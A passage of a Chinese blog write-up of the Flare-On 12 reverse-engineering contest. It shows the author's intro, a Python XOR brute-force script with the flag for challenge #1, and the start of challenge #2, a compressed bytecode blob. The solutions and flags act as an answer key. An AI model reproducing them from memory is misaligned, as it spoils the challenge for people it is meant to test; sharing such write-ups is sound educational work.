<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/fontawesome/css/brands.css" rel="stylesheet">
<link href="/fontawesome/css/solid.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  

  
  <title>The Flare-On Challenge #12 (2025) WriteUp | 棱晶の小窝</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="前言第一次参加Flare-On挑战赛，经过了一周半左右的不懈坚持与坐牢奋斗，最终实现了9道题目的全解，且是国内真正实现全解的选手中名次比较靠前的（第3名），个人还是比较惊讶和非常满意的，毕竟自己一开始也没想到居然能攻克到最后一关并实现全解，但不知不觉地就完成了。题解是边做边写的，可能有些跳跃（毕竟做题的时候就是一个思路或者灵感跳跃到另一个，难免会有回看之后收获新发现的情况），对于特别复杂的题，">
<meta property="og:type" content="article">
<meta property="og:title" content="The Flare-On Challenge #12 (2025) WriteUp">
<meta property="og:url" content="https://astralprisma.github.io/2025/10/08/flareon_12/index.html">
<meta property="og:site_name" content="棱晶の小窝">
<meta property="og:description" content="前言第一次参加Flare-On挑战赛，经过了一周半左右的不懈坚持与坐牢奋斗，最终实现了9道题目的全解，且是国内真正实现全解的选手中名次比较靠前的（第3名），个人还是比较惊讶和非常满意的，毕竟自己一开始也没想到居然能攻克到最后一关并实现全解，但不知不觉地就完成了。题解是边做边写的，可能有些跳跃（毕竟做题的时候就是一个思路或者灵感跳跃到另一个，难免会有回看之后收获新发现的情况），对于特别复杂的题，">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="d:/BY/blogs/source/pictures/flareon_12_4.png">
<meta property="og:image" content="d:/BY/blogs/source/pictures/flareon_12_7.jpg">
<meta property="og:image" content="d:/BY/blogs/source/pictures/flareon_12_8_trace.png">
<meta property="og:image" content="d:/BY/blogs/source/pictures/flareon_12_8_trace_seg2.png">
<meta property="article:published_time" content="2025-10-08T00:00:00.000Z">
<meta property="article:modified_time" content="2025-11-09T20:34:26.900Z">
<meta property="article:author" content="Astral Prisma">
<meta property="article:tag" content="Python">
<meta property="article:tag" content="Obfuscate">
<meta property="article:tag" content="Indirect Jump">
<meta property="article:tag" content="AutoRe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="d:/BY/blogs/source/pictures/flareon_12_4.png">
  
  
    <link rel="shortcut icon" href="/AP.png">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/OTSA.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="shadow   ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>棱晶の小窝 </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/XH_2.png></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Astral Prisma </div>
      <div class="dot"></div>
      <div class="subtitle">星界棱晶 </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/454936579" title="Bilibili"><image src=https://www.bilibili.com/favicon.ico></image></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://www.primegrid.com/show_user.php?userid=1243718" title="PrimeGrid"><image src=https://www.primegrid.com/images/favicon_32.png></image></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/AstralPrisma" title="GitHub"><image src=https://github.githubassets.com/favicons/favicon.png></image></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">分类</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/WriteUp/">
                WriteUp
                <div class="category-count">36</div>
            </a>
        
            <a class="category-link" href="/categories/Ideas/">
                Ideas
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/">
                出题记录
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">标签</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/got/" rel="tag">.got</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ARM/" rel="tag">ARM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AutoRe/" rel="tag">AutoRe</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Brainfuck/" rel="tag">Brainfuck</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C#</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CUDA/" rel="tag">CUDA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Cheat-Engine/" rel="tag">Cheat Engine</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DOS/" rel="tag">DOS</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Driver/" rel="tag">Driver</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Frida-Hook/" rel="tag">Frida Hook</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Golang/" rel="tag">Golang</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Harmony-OS/" rel="tag">Harmony OS</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/IPC/" rel="tag">IPC</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Indirect-Jump/" rel="tag">Indirect Jump</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Kotlin/" rel="tag">Kotlin</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Lua/" rel="tag">Lua</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Mac/" rel="tag">Mac</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Obfuscate/" rel="tag">Obfuscate</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pascal/" rel="tag">Pascal</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Powershell/" rel="tag">Powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pyarmor/" rel="tag">Pyarmor</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/QEMU/" rel="tag">QEMU</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/R2R/" rel="tag">R2R</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Remote/" rel="tag">Remote</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rust/" rel="tag">Rust</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Subprocess/" rel="tag">Subprocess</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Traffic/" rel="tag">Traffic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Unicorn/" rel="tag">Unicorn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/VM/" rel="tag">VM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WASM/" rel="tag">WASM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Wechat-Mini-Program/" rel="tag">Wechat Mini Program</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Windows-DLL/" rel="tag">Windows DLL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Yara/" rel="tag">Yara</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iOS/" rel="tag">iOS</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/il2cpp/" rel="tag">il2cpp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pickle/" rel="tag">pickle</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/x96/" rel="tag">x96</a></li></ul>
    </div>
  </div>


    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       

<article id="post-flareon_12" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        The Flare-On Challenge #12 (2025) WriteUp
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2025-10-08T00:00:00.000Z" itemprop="datePublished">2025-10-08</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/WriteUp/">WriteUp</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            30k 词 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AutoRe/" rel="tag">AutoRe</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Indirect-Jump/" rel="tag">Indirect Jump</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Obfuscate/" rel="tag">Obfuscate</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <!-- # <center>The 12th Flare-On Challenge<br>题 目 全 解<br></center><div style="text-align: right;"><span style="font-weight: bold; font-size: 18px; background: linear-gradient(90deg, deepskyblue 10%, #9A32CD 90%); -webkit-background-clip: text; color: transparent;">Astral Prisma</span></div> -->

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><center><small>前言</small></center></h1><p>第一次参加Flare-On挑战赛，经过了一周半左右的不懈坚持与<del>坐牢</del>奋斗，最终实现了9道题目的全解，且是国内真正实现全解的选手中名次比较靠前的（第3名），个人还是比较惊讶和非常满意的，毕竟自己一开始也没想到居然能攻克到最后一关并实现全解，但不知不觉地就完成了。题解是边做边写的，可能有些跳跃（毕竟做题的时候就是一个思路或者灵感跳跃到另一个，难免会有回看之后收获新发现的情况），对于特别复杂的题，已经尽可能地整理成按顺序的思路了，还请见谅。</p>
<h1 id="1-Drill-Baby-Drill"><a href="#1-Drill-Baby-Drill" class="headerlink" title="#1 Drill Baby Drill!"></a>#1 Drill Baby Drill!</h1><p>只有一个异或，爆破即可</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">encoded = <span class="string">b&quot;\xd0\xc7\xdf\xdb\xd4\xd0\xd4\xdc\xe3\xdb\xd1\xcd\x9f\xb5\xa7\xa7\xa0\xac\xa3\xb4\x88\xaf\xa6\xaa\xbe\xa8\xe3\xa0\xbe\xff\xb1\xbc\xb9&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2</span>&lt;&lt;<span class="number">15</span>,<span class="number">2</span>&lt;&lt;<span class="number">8</span>):</span><br><span class="line">    key = j &gt;&gt; <span class="number">8</span></span><br><span class="line">    plaintext = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encoded)):</span><br><span class="line">        plaintext.append(encoded[i] ^ (key+i) &amp; <span class="number">0xFF</span>)</span><br><span class="line">    <span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure>

<p><font color=deepskyblue><strong><a href="mailto:&#x64;&#x72;&#105;&#x6c;&#108;&#105;&#110;&#x67;&#x5f;&#102;&#x6f;&#x72;&#95;&#116;&#x65;&#100;&#100;&#105;&#101;&#x73;&#x40;&#102;&#108;&#97;&#x72;&#101;&#45;&#111;&#110;&#x2e;&#x63;&#x6f;&#109;">drilling_for_teddies@flare-on.com</a></strong></font></p>
<h1 id="2-project-chimera"><a href="#2-project-chimera" class="headerlink" title="#2 project_chimera"></a>#2 project_chimera</h1><p>先反编译第一层：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line">encrypted_sequencer_data = <span class="string">b&#x27;x\x9cm\x96K\xcf\xe2\xe6\x15\xc7\xfd\xcedf\x92\xe6\xd2J\x93\xceTI\x9b\x8c\x05&amp;\x18\xe4\t\x06\x03/\xc2\xdc1w\xcc\x1dl/\x00_\x01\xe3\x1b6\xc6\xe6\xfa\x15\x9a\xae\xd2\xae\xba\xae\xd2/Q\xf5\x0b\xbc\xd1\xa4JJVUV\xdd\xa5\xca\xae\xab\xf2\xceM\x89\x9ag\xe1\xf3\x9cs~\xe7\xfc\x8f\x1f\xc9\xd6\xf3\x1d\xf0\xa3u\xef\xa5\xfd\xe1\xce\x15\x00|\x0e\x08\x80p\xa5\x00\xcc\x0b&#123;\xc5\\=\xb7w\x98;\xcf\xed]\xe6\xaep\x87y\xe3\x0e \xde\x13\xee~q\xf5\xa2\xf0\nx\xee\xbf\xf1\x13\x1f\x90\xdf\x01\xfeo\x89\xaf\x19\xe6\xc1\x85\xb9\x92\x7f\xf53\xcc\x83\xd7\xcc[\x17\xe6\x8e\xfc\xfe\xcf0o\xbdf\xde~\xae&#125;\xef\&#x27;\xdaw\xe5\xdf\xfcL\xcd-\xf9\xee\x17/\xbd/\xee\xbc\xac\x7f\xef\x12&#125;\xefU\xf4\n\xd8^\xc1\xf7\xff&#125;\xbb%\xad\xbf\xbe\t\x00\xbc\xf7 \x06[\xe9\xb8\x0f\x89MU\xb0\xbbc\x97\&#x27;E!\x0ea&lt;\t\xfa\xc7\x81aG\xf3\xac\x88\xca\xe1\xe0\x12a\xce\x1b\x18\xa5v\xce59:\x85\xd5Y\xb5)G\xac\x92\xbc\xdbB8Y\xeb\\cc\xeff%\xf6\xcb&gt;\xb5\x10\xdc\xce\x15&quot;\x16\x8f\xcb\xc85\\\xc2\xb4b\xfa\x94\xc1\xcb\xabF\x0c\xd3\x95M\xde\xf2r\x0c\xb6_\x11\xc9\xfd!ed\x9bX\x8e\x13\xb9q ]\xd8U\r\xb361\x0bT\x83B\xb3K8\x8ay+\x95AC\xab\x8a\xd16\xa2\xc0\xb9\xb9\x0c\x06b\xce\xbexR \xaa\xe9\x14\xdb\xb6G.\xd2sj\\$\xf7\xabh\xe7\x10EF+\x08\xcd*y\xf7x&lt;lH\xd48\r\xaa\xd7s84\xf0i=4R\x9c\x1d\xdd\xeb\xfa\x98@\xfc+\xaf\x11:b\xa0\xb2E u\x1f\xaa\x08\xe9q0\x12\xc0[\xfb\x80\x15\xaa#\xca\xf2p\xcc7*\xa3z\xcd\x11;&amp;\xb9\x8b\xee\xa1\x12\x92\xcc\x12\x93\xbd\x10\xac\xaa&#125;%\x8e\xe8q\xdf\xb1\xb5\x87l\x8e\x85\x1d\xb4\xdb\x08\x0cr]*\x10O\xac\x83!|\x9c\xcf\xecT\xa5U\xa4\x12\x870\xb73&amp;\xbb\xb5#o\&#x27;&#125;\xa1\xce\xc1($\xb61\x01\xa1\xd6\x8b\x10=\x93\x97\x13\xc8\x01\xc7\x10\xea\xdaMr\x831\xd7&gt;\x7f` \xc6\&#x27;\xe3\x12\xb7E\xb5H2X\xc6\x87\xc5\x9c\xb4Z\x8c\xe7h:\x94M\x11\xcbE\x14l\x9eL\xd5\x82X\xc9\x9d\x06m\x97\r\x05\x92\xa5\x9d-\x18+R\xd1\xa2M&lt;\x0b\xb6V\x9a\xc0\xc0]|3\xc7l\xdf\xccPU\x8dm\x8a\x0e\xd7\x0fuk\xdc6\xe3\x97\xd885\xf2\x98i\xa6\x83\r\x08\x9f&#125;8)\x8cE\xd0\&#x27;D1\xa4QS\nM\x82\xc6\x10\xa9L\xdbTU3\x1cu\xab\x9fTf\xba\x96\x06\xf5\x8c\xdf[\xaf\xb0\x90\xba!\x15&#125;\xc3$i\xb8\x18\x14c\xb6\x13T\xe9X\x83\xcc\x87\xe9\x84\x8f]r#\x83\xc9*\xf3To\x81\x83\xb5\xec\xfaP(_\xc7\x88),\x1b\xa0\x82\xb9\x04\xed\x9f\xc7\xb3^E\xc9a\xc7|B0\x1a\x01\x19\x16\x1b\xfb\xcd\x90\xe7\xb6M7:\xd9sh\x04&amp;\xb3\x0e&#123;\x12\x8d\xde5#\xe9\xbe\xe1\x84\xf6H\xcd\xc0,\x91\xcc\xc6 9\x05-\xa0Q&gt;\x94\xea\xf4&quot;\xa2#gC\xa7&lt;\xb8Xp6\xde\\\x99f\xadZ\xd9\xab\xbe\x92\x9e+\xe7#\x9e\x10)%]\xf0$l:\x87\x84\&#x27;\xc2\x1f\xe1j#\xb6$6\xf3\xfc\xb6\xb6\xc9\xed\xf3\th\xb0\xa2B\xfdY\x00\t\xe6\x96\&#x27;r\xe4\xbb\x1cK&gt;\xc3\xc6\x1c\x91\xb88\xe6\xae\xbb\x083y0\x86\xc5+#%76\xcb\xd8l#G\xe8\xb5\xa8GB\xbe\xc01\x19M$\xe3Z\xad\x14\x17\xe7\xf1\x8dLP\x8e\xe3\xb6G\xa3]1\x10\xc1\xab\x1b\xa6\xe7Q\xaa\r\xbf\x12\xc8\xd8\xde$Q^Hu\xa9Q4\x86\\\xc0\xa4\x1a[\x07\xcc\xb5OL\x7f\x8c\xf4R\x18\xb5\x8f\xa0\xeb\x95\x88\xb7\xd0\xa5S\xf6\xce\xf2\x8cf_\x8b\x1b6r\x8a%\xb1\x82k\xf2\x15t\xdf\x99\xed\x9b\xc9r?\x9a\xcd\x0b\xab5d\xed\xdde?Y\xdc\xb2\xf9%\xbcI\xf3&#125;\xd3\x93\xa2\x9aY\xbe\x83\x0c\x19\xa6\x86\xb2\xbb\xf9\x1e-J\&#x27;\xc9\x91\xfc\xaa@/\&#x27;&lt;Q\x98N=;S\xdc\x0cl\tE\xaa\xf1b\xa5\xber\x13|\xbc)f\x02\x0b\xd26\x13\x17-\x1d\xce\xa19\xb5\xc2\xd5\xc1\x98g\x89\x0b\xc1\x8eJ\xc9\xfa@1s|\xaa\x8b\\\x13\x12\xb1\xd1\xbc\xfd6\x94a\xb804E\x92N)\xcc\xc4\xf9Sg\x0ev\x06\x06\x94-\xc5\x05\x7f\&#x27;Y]g5%\x82.\x1c~L\x16\xfa&#125;S\x0e\xb4F0GT\xd2yZ\xe9xiu1\xef\r\xc3\x9d\xa2k\x16\xac:\xd9\xd7\t\xd5&quot;\x17\xd2)\x89T\x1b\xe5\xa0\xe2\xcd\x9e\xacf\x91\xd7\x88\n]\xe5d.\xd3@,G\x87\xd2$I\xc7B\x9dZt\x1anP~\x9f\xb7P\x92\x02#?\xaf\xc4\xd7\xd7\xa1D$\x91\xedT\x82\xe9$\xb8\xaccr\xb3\xbfhur\xc7]3+\xf4\x82\x8e\xba\xc42\xdd\xb5\xb5\xaaZ~rm3\xa6\x9fpd|\xe7R\xecP_[`\x0c?\x0e\xda\xd1\xb4F\x1a\xe8LZ\x8a\x16\xd6\x0f\xec\x84=\x1c\x9b#\xe5\x12\x96&amp;&#123;\x9d\xd6\xb1\x1bH\xa0&#123;~\xba\x04SE\xa4x\xe4X\xd2\x8bJ\xf6\x904\x07\xc5MyA\x0f\xa9\x11\x9d\xafb\xd1\xd8^-\x94\xa7\xf6\xd2f$\x83\x84s\xb8\xbb\xe5R\xd6\x91\xdb\x12\xfe\xe2\x86\x91T\xa3\xbb\xdc\xe8X\xa19\x0b\x96\x02\x91\x02$\xc5&lt;\x19u?\xcb\xf61\x1b)\xe3\&#x27;5\x7fr\xca\xd4,I\x0e\x9b\xa5\xa2\xec\x93\xa28\xbc*\xa3\x9e\xb8\xab\xd0B\x89\xe8L\xe4J\xd7\x0e\x88\xbe\xd2@\xed\xa05\xbcl\x1c1\xaf\xbb\xcanY\xa5\xe0w\xe1\x1eR\xaa\x12\xb3\x8e\x18\xac\xba\xb9n\xa3\xd6\xee\xaa\xd9&quot;\xe5\xfa\xd6A|\x1em\x84Z\xdd\x1aN\xe0\xbcs\x8c)Z,#\xba\x8d\xca\xf6\x98\x98\x08\x04f\xec\xd0\xb8\xde\xf0\x9f\x88\xe9\x9e\x9d\x12\x88\xa6\xc73\xd3(l\x14\t\x83\xa4\xfdHl\xc8\xd62\x851^K\xf8\xcb$\x98Kj\xd3v\xbf]d\xf2DrD\xa6\xa3\xcb\x14\xabZS&#123;\xbb\xc5]\x95\xa1\x85lkv\x08a&#123;t\xe0\x0f\xa0\xedr\xa3\x9b\x9eGFT\x86eF\x1d\xe9\x14Kdd\xa4d\xa9\x8dqyS\xd5\xcc\xd9B\xd0\x9b\xe1\xa3\x89\xda\xbe#\x95\x0f\xae\x8ezy\x86\x90]\x8f6\xa6\x02\x98\xbd\xcao3\xe8\x8a\xf6b\xb8\xbck\xe6\xe7T\x0eN\xee\xda\x92\x1b\t\xb8\x03p8\xf2z\xa4\x12\xebk\x16ZR\xb72\xd4BPly\xcd\xb2]\&#x27;!\xd0\x198\x0e\xdamP+W\x08\xce\xb3\x0c\xd6\\\xfa\x10\x9e\xa7\x97\xd4\x9e\xdcC\xe0\xb4*m\xda\xd4\xa1\x97\x15A-\x17\xa9nO\x1e\xbe&gt;4a\x88/\xb9&#123;\x95\xee\x95\xe5\xc4\x1c\xadL:1QX\xce\xed\xf2\x12\x8e0\x89\xd9\xc8\x98\x9e\xd4\xda\xae\x1c\xc7\xd4\xb8\x1f\xac\x8du?\x18\x16\xc4\xa9\xda\xcaD\xaa\xc5\x1d?Lz\xbb\x9diV\xd2\x17tE\x91\xa1\xfd\xe5\x87\x9c\xf6,\xfa\x87zz\x83L\xe9\n\xdc\xee\xbb\x1e\xa9k\xfb\x0f\xd9\x9cU\xef&#123;\xdac\x98\xd7X\xf0\x90\xb0\x06\xdb\x01\xd2\\\xe7\xdc\xf6\xb1\x99v\x0e\x05\x1e\xb5\xb0I\xbd\x9a\x98+Fx&#123;\x18\xe4\x88\x9a\xb7\x10\xf6b\xady\xec\x94\xb5e\x04\xa4\x91\xe8\x9a\xd8V\xbd4T\&#x27;\n$f\xc7\x14&lt;\x90\x91x\xa7;\x91\x8a\xe3CP\x90\x8b\xd5Z\xd4\x06\xd39\x1fJ&amp;\x16ku\x8fGt\xc4\xd6\x92\x08|\x9d\x18&#123;\x8cj[\xd8\x0f\x9d\xed\xae2AG\xad\xed\x8a\xf1V\xe0\xa5\x97\xa2\x8a\x88\xcb\x0fXi&amp;s)\xd2\xb3\x00\x83-MC\xfa2\xc2\x13:\x17\xf4\x83\xfe|k\xc4\xa6K\xebB2\x8c\x16+&#123;h\\\xad\xe8)\x1eJ\x9aI\xd9Z\x93ht\xd5\x9b\x0c\xc6\xa5T\x8e\xf3\xf2\xd1\xd6&lt;:\xcaH4\x08\x8d7\x02%\x11\xe9(-\x81f\xa54\xc6\xd9\xd24\x1f\xe0\xc4@#\xe5/\x94\xfc\x10B\xe0\x19\x1